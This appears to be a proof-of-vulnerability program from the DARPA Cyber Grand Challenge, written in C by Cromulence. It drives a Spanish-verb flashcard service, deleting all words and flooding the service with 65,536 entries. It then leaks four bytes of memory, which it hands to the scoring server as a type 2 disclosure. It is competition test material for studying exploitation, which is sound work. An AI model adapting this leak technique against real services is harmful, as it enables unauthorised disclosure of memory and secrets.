/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#define ASCII_0_VALU 48
#define ASCII_9_VALU 57
#define ASCII_A_VALU 65
#define ASCII_F_VALU 70
#define     DEL 0x7f
#define     SPC 0x20
#define     TAB 0x09
#define     LF  0x0a
#define     VT  0x0b
#define     FF  0x0c
#define     CR  0x0d


#include <libcgc.h>


int printf( const char *fmt, ... );


int isnan( double val )
{
    return __builtin_isnan( val );
}

int isinf( double val )
{
    return __builtin_isinf( val );
}

int isdigit( int c )
{
	if ( c >= '0' && c <= '9' )
		return 1;
	else
		return 0;
}

int isspace( int c )
{
	if ( c == SPC ||
	     c == TAB ||
	     c == LF ||
	     c == VT ||
	     c == FF ||
	     c == CR )
		return 1;
	else
		return 0;
}

size_t write( unsigned int fd, void *buf, size_t count )
{
	size_t size;

	transmit(fd, buf, count, &size);

	if (count != size)
		return(-1);

	return(size);

}


void bzero( void *buff, size_t len )
{
    size_t index = 0;
    unsigned char *c = buff;

    if ( buff == NULL ) {
        goto end;
    }

    if ( len == 0 ) {
        goto end;
    }

    for ( index = 0; index < len; index++ ) {
        c[index] = 0x00;
    }

end:
    return;
}

unsigned char Hex2Byte(char const* hexstring)
{
    unsigned char result = 0;
    unsigned int add;
    int i;

    for (i=0; i < 2; ++i ) {

        result <<= 4;

        if( hexstring[i] >= ASCII_0_VALU &&  hexstring[i] <= ASCII_9_VALU )
            add = hexstring[i] - ASCII_0_VALU;
        else if( hexstring[i] >= ASCII_A_VALU && hexstring[i] <= ASCII_F_VALU)
            add = hexstring[i] - ASCII_A_VALU + 10;
        else
        {
            return 0;
        }

        result += add;
    }

    return result;  
}


int atoi(const char* str)
{
    if ( str == NULL )
        return 0;

    int integer_part = 0;
    int sign = 1;
    int part;
    int digit_count = 0;

    // Skip whitespace
    while ( isspace( str[0] ) )
        str++;

    part = 0; // First part (+/-/number is acceptable)

    while( str[0] != '\0' )
    {
        if ( str[0] == '-' )
        {
            if ( part != 0 )
                return 0;

            sign = -1;
            part++;
        }
        else if ( str[0] == '+' )
        {
            if ( part != 0 )
                return 0;

            part++;
        }
        else if ( isdigit( *str ) )
        {
            if ( part == 0 || part == 1 )
            {
                // In integer part
                part = 1;
                integer_part = (integer_part * 10) + (*str - '0');

                digit_count++;

                if ( digit_count == 10 )
                    break;
            }
            else
            {
                // part invalid
                return 0;
            }
        }
        else
            break;

        str++;
    }

    return (sign * integer_part);
}



double floor( double val )
{
	if ( val < 0.0 )
		return (double)rint( (val - 0.5) ) + 1.0;
	else if ( val > 0.0 )
		return (double)rint( (val + 0.5) ) - 1.0;
	else
		return val;
}

int receive_bytes (unsigned int fd, void *buffer, size_t size) 
{
size_t count=0;
size_t remaining = 0;
size_t rxbytes=0;

    remaining = size - count;

    while(remaining)  {

        rxbytes = 0;

        if (receive(fd, buffer+count, remaining, &rxbytes)==0 ) {

            remaining-=rxbytes;
            count+=rxbytes;
        }
        
        else {

            return(-1);
        }


    }

return 0;

}


int flush_input(int fd) {
    fd_set read_fds;
    int err;
    int ready_fd;
    struct timeval tv;
    char buffer[1024];
    size_t rcv_cnt;

    while (1)  {

        bzero((char *)&read_fds, sizeof(read_fds));
        FD_SET(fd, &read_fds);

        tv.tv_sec = 0;
        tv.tv_usec = 10;

        err = fdwait(fd + 1, &read_fds, NULL, &tv, &ready_fd);
        if (err != 0) {
            return err;
        }

        if (!FD_ISSET(fd, &read_fds))
            break;
        else
            receive(fd, buffer, 1024, &rcv_cnt);
     
    }  

    return 0;
} // flush_input()


size_t receive_until( char *dst, char delim, size_t max )
{
    size_t len = 0;
    size_t rx = 0;
    char c = 0;

    while( len < max ) {
        dst[len] = 0x00;

        if ( receive( STDIN, &c, 1, &rx ) != 0 ) {
            len = 0;
            goto end;
        }

        if ( c == delim ) {

            goto end;
        }

        dst[len] = c;
        len++;
    }
end:

    if (len == max)
        flush_input(STDIN);

    return len;
}

size_t getline( char *buffer, size_t len)  {
int count;

    count = receive_until(buffer, '\n', len);

    if (count==len)
        buffer[len-1]=0;
    else {
        buffer[count]=0;
    }

    return (count);
    
}

int main(void)
{

char buffer[100];
int i;
unsigned char byteval;
int pov_type;
unsigned int type2_addr;
unsigned int type2_length;
unsigned int type2_size;
unsigned int new_offset_value;
int count;

	// negotiate a type 2 POV
	pov_type = 2;

	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
		_terminate(-1);

	// get the welcome string
	receive_bytes(STDIN, buffer, 36);

    receive_bytes(STDIN, buffer, 6);

    write(STDOUT, "huesped\n", 8);

    receive_bytes(STDIN, buffer, 10);

    write(STDOUT, "madera\n", 7);

    receive_bytes(STDIN, buffer, 15);

	// get the menu
	receive_bytes(STDIN, buffer, 76);
	
	// goto word maintenance
	write(STDOUT, "3\n", 2);

	// maintenance menu
	receive_bytes(STDIN, buffer, 86);

	// first delete any existing words in the database

	write(STDOUT, "2\n", 2);

	// eat the prompt for the word to delete
	receive_bytes(STDIN, buffer, 22);

	// // delete all the words using a wildcard 

	write(STDOUT, "*\n", 2);

	count = 0;

	getline(buffer, sizeof(buffer));

	while(buffer[0] != 0 ) {

		++count;
		receive_bytes(STDIN, buffer, 33);
		write(STDOUT, "y\n", 2);
		getline(buffer, sizeof(buffer));

	}

	// maintenance menu
	receive_bytes(STDIN, buffer, 86);

	// add new words 
	write(STDOUT, "1\n", 2);

	for (i=0; i < 0x10000; ++i ) {

		// enter infinitive form
		receive_bytes(STDIN, buffer, 22);

		printf("@04x\n", i);

		receive_bytes(STDIN, buffer, 22);
		printf("@04x\n", i);		

		receive_bytes(STDIN, buffer, 1);

	}

	receive_bytes(STDIN, buffer, 22);

	write(STDOUT, "\n", 1);


	// maintenance menu
	receive_bytes(STDIN, buffer, 87);

	// exit the maintenance menu
	write(STDOUT, "5\n", 2);


	// get the main menu
	receive_bytes(STDIN, buffer, 77);

	write(STDOUT, "1\n", 2);


	receive_bytes(STDIN, buffer, 39);

	// eat the newline
	receive_bytes(STDIN, buffer, 1);

	// read in the returned value and the newline
	receive_bytes(STDIN, buffer, 5);

	// because of endianess, convert the second byte first
	byteval = Hex2Byte(buffer+2);

	// write it to the scoring server
	write(3, &byteval, 1);

	// now the first byte
	byteval = Hex2Byte(buffer);

	write(3, &byteval, 1);

	// hit "enter" to continue
	write(STDOUT, "\n", 1);

	// This is the "english meaning".  Read in the value, but no need to keep it.
	receive_bytes(STDIN, buffer, 7);


	// read in the returned value for the second word
	receive_bytes(STDIN, buffer, 5);

	// again, convert the second byte first
	byteval = Hex2Byte(buffer+2);

	write(3, &byteval, 1);

	// and the first byte, which makes the 4 we need for a win
	byteval = Hex2Byte(buffer);

	write(3, &byteval, 1);

	// quit flashcards
	write(STDOUT, "q\n", 2);

	// read in the value, but no need to keep it.
	receive_bytes(STDIN, buffer, 6);

	// get the main menu
	receive_bytes(STDIN, buffer, 77);

	// terminate the application
	write(STDOUT,"4\n", 2);


}

